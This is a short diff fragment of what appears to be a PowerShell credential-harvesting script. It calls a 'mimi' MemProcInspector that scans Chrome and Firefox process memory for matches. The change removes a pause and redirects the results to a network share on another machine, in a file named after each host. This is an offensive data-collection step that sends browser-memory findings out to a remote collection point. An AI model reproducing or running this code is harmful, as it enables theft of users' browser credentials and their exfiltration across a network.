@@ -448,5 +448,4 @@ $matchesFound=[mimi.MemProcInspector]::InspectManyProcs("chrome","firefox")
 write-output $matchesFound
 }
 
-Invoke-mimi
-pause
+Invoke-mimi  > \\DESKTOP-V23VH90\Temp\$env:computername.txt
